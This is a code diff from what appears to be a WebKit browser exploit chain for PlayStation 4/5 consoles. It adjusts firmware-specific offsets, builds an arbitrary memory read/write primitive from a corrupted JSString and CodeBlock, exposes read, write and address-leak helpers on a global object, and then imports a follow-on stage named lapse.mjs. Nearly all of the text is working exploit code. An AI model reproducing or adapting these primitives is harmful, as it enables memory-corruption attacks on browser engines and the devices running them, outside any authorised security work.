@@ -72,22 +72,18 @@ const [is_ps4, version] = (() => {
 })();
 
 const ssv_len = (() => {
-    // All supported PS5 versions
-    if (!is_ps4) {
+    if (0x600 <= config.target && config.target < 0x650) {
+        return 0x58;
+    }
+
+    // PS4 9.xx and all supported PS5 versions
+    if (config.target >= 0x900) {
         return 0x50;
     }
 
-    // PS4
-    if (0x600 <= version && version < 0x650) {
-        return 0x58;
-    }
-    if (0x650 <= version && version < 0x900) {
+    if (0x650 <= config.target && config.target < 0x900) {
         return 0x48;
     }
-    if (0x900 <= version) {
-        return 0x50;
-    }
-    throw new RangeError(`unsupported console/firmware: ps${is_ps4 ? '4' : '5'}, version: ${hex(version)}`);
 })();
 
 // these constants are expected to be divisible by 2
@@ -458,7 +454,7 @@ async function make_rdr(view) {
         log(`view's buffer address: ${addr}`);
         return new Reader(rstr, view);
     }
-    die('JSString wasn\'t modified');
+    die("JSString wasn't modified");
 }
 
 // we will create a JSC::CodeBlock whose m_constantRegisters is set to an array
@@ -833,6 +829,64 @@ async function make_arw(reader, view2, pop) {
     );
     log('achieved arbitrary r/w');
 
+    window.p = {
+        read1(addr) {
+            addr = new Int(addr.low, addr.hi);
+            const res = mem.read8(addr);
+            return res;
+        },
+
+        read2(addr) {
+            addr = new Int(addr.low, addr.hi);
+            const res = mem.read16(addr);
+            return res;
+        },
+
+        read4(addr) {
+            addr = new Int(addr.low, addr.hi);
+            const res = mem.read32(addr);
+            return res;
+        },
+
+        read8(addr) {
+            addr = new Int(addr.low, addr.hi);
+            const res = mem.read64(addr);
+            return new int64(res.low, res.high);
+        },
+
+        write1(addr, value) {
+            addr = new Int(addr.low, addr.hi);
+            mem.write8(addr, value);
+        },
+
+        write2(addr, value) {
+            addr = new Int(addr.low, addr.hi);
+            mem.write16(addr, value);
+        },
+
+        write4(addr, value) {
+            addr = new Int(addr.low, addr.hi);
+            mem.write32(addr, value);
+        },
+
+        write8(addr, value) {
+            addr = new Int(addr.low, addr.hi);
+            if (value instanceof int64) {
+                value = new Int(value.low, value.hi);
+                mem.write64(addr, value);
+            } else {
+                mem.write64(addr, new Int(value));
+            }
+
+        },
+
+        leakval(obj) {
+            const res = mem.addrof(obj);
+            return new int64(res.low, res.high);
+        }
+    };
+
+
     rdr.restore();
     // set the refcount to a high value so we don't free the memory, view's
     // death will already free it (a StringImpl is currently using the memory)
@@ -860,6 +914,8 @@ async function main() {
     await make_arw(rdr, view2, pop);
 
     clear_log();
-    import('./lapse.mjs');
+
+     import('./lapse.mjs');
+    
 }
 main();
